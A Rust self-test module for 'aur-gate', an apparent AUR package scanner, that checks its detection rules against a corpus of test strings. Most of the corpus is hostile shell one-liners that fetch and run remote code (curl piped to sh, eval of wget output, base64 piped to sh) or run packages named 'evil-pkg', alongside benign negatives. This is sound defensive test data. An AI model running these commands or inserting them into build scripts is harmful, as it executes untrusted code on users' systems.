//! Installed-binary rule-table verification.
//!
//! Keep this corpus shared with `cargo test`: the installed binary can validate
//! its compiled rules without source files, while CI gets ordinary assertions.

use crate::rules;

const HARD_CASES: &[(&str, &str, bool)] = &[
    ("npm-install", "npm install crypto-javascript", true),
    ("npm-i", "npm i atomic-lockfile", true),
    ("npm-add", "npm add lodash", true),
    (
        "npm-global-install",
        "npm -g install crypto-javascript",
        true,
    ),
    ("npm-prefix-install", "npm --prefix /tmp/a install x", true),
    ("bun-add", "bun add js-digest", true),
    ("bun-cwd-add", "bun --cwd /tmp/a add x", true),
    ("pnpm-add", "pnpm add nextfile-js", true),
    ("pnpm-dir-install", "pnpm --dir /tmp/a install x", true),
    (
        "yarn-cache-install",
        "yarn --cache-folder /tmp/y install",
        true,
    ),
    ("npx", "npx evil-pkg", true),
    ("npx-flagged", "npx --yes evil-pkg", true),
    ("bunx", "bunx evil-pkg", true),
    ("bunx-flagged", "bunx --bun evil-pkg", true),
    ("pnpm-exec", "pnpm exec evil-pkg", true),
    ("pnpm-dlx", "pnpm dlx evil-pkg", true),
    ("yarn-exec", "yarn exec evil-pkg", true),
    ("yarn-dlx", "yarn dlx evil-pkg", true),
    ("install-hook-ref", "install=evil-deps.install", true),
    ("dynamic-install-hook-ref", "install=$_hook", true),
    ("post-install-func", "post_install() { cd /tmp; }", true),
    (
        "function-syntax-hook",
        "function pre_upgrade { npm i x; }",
        true,
    ),
    ("no-parens-hook", "post_remove { :; }", true),
    ("curl-pipe-sh", "curl https://x.sh | sh", true),
    ("curl-pipe-python", "curl https://x | python3", true),
    ("wget-pipe-perl", "wget -qO- https://x | perl", true),
    ("sudo-bash-pipe", "curl https://x | sudo bash", true),
    ("proc-subst", "bash <(curl -s http://x)", true),
    ("eval-dollar", "eval $(curl -s http://x)", true),
    ("eval-backtick", "eval `wget -qO- http://x`", true),
    ("eval-quoted-dollar", "eval \"$(curl -s http://x)\"", true),
    ("backtick-net", "`curl -s http://x` > /tmp/x", true),
    ("bash-c-curl", "bash -c '$(curl -s http://x)'", true),
    ("bash-lc-curl", "bash -lc \"$(curl -s http://x)\"", true),
    ("bash-ec-curl", "bash -ec '$(curl -s http://x)'", true),
    ("sh-o-c-curl", "sh -o xtrace -c '$(curl -s http://x)'", true),
    (
        "fetch-file-exec",
        "curl -o /tmp/p http://x; bash /tmp/p",
        true,
    ),
    (
        "wget-file-exec",
        "wget -O /tmp/p http://x && sh /tmp/p",
        true,
    ),
    ("base64-decode", "echo AAAA | base64 -d | sh", true),
    (
        "base64-flag-decode",
        "base64 --ignore-garbage -d payload",
        true,
    ),
    ("openssl-base64", "openssl enc -d -base64 -in /tmp/p", true),
    ("xxd-reverse", "xxd -r -p /tmp/p | sh", true),
    ("hex-run", r#"printf "\x6e\x70\x6d""#, true),
    ("octal-run", r#"printf "\156\160\155""#, true),
    ("hex-single-ansi", r#"printf "\x1b[0;31m""#, false),
    ("octal-single-ansi", r#"printf "\033[0;31m""#, false),
    ("clean-comment", "# this package builds fine", false),
    (
        "bash-c-comment-clean",
        "# bash -c wraps curl internally",
        false,
    ),
    (
        "clean-source",
        r#"source=("https://kernel.org/linux.tar")"#,
        false,
    ),
    ("clean-make", "make && make install", false),
    (
        "clean-eval-string",
        r#"eval "configure --prefix=/usr""#,
        false,
    ),
    ("npm-init-clean", "npm init -y", false),
    ("npm-version-clean", "npm --version", false),
    (
        "curl-output-noexec",
        "curl -o source.tar.gz https://example/x",
        false,
    ),
];

const REVIEW_CASES: &[(&str, &str)] = &[
    ("review-checksum-skip", "sha256sums=('SKIP')"),
    ("review-single-hex", r#"printf "\x1b[0m""#),
    ("review-pip", "python -m pip install foo"),
    ("review-cargo", "cargo install cargo-audit"),
    ("review-python-inline", "python3 -c 'import socket'"),
];

fn failures() -> Vec<String> {
    let hard = rules::hard_rules();
    let review = rules::review_rules();
    let mut failures = Vec::new();
    for (name, input, expected) in HARD_CASES {
        let got = hard.iter().any(|rule| rule.re.is_match(input.as_bytes()));
        if got != *expected {
            failures.push(format!("{name}: expected hard={expected}, got {got}"));
        }
    }
    for (name, input) in REVIEW_CASES {
        if !review.iter().any(|rule| rule.re.is_match(input.as_bytes())) {
            failures.push(format!("{name}: review rule did not match"));
        }
    }
    failures
}

pub fn run() -> i32 {
    eprintln!("aur-gate self-test");
    let failed = failures();
    for failure in &failed {
        eprintln!("  FAIL {failure}");
    }
    let total = HARD_CASES.len() + REVIEW_CASES.len();
    let passed = total - failed.len();
    eprintln!("\n  {passed} passed, {} failed", failed.len());
    i32::from(!failed.is_empty())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn embedded_rule_corpus_passes() {
        let failed = failures();
        assert!(failed.is_empty(), "{}", failed.join("\n"));
    }
}
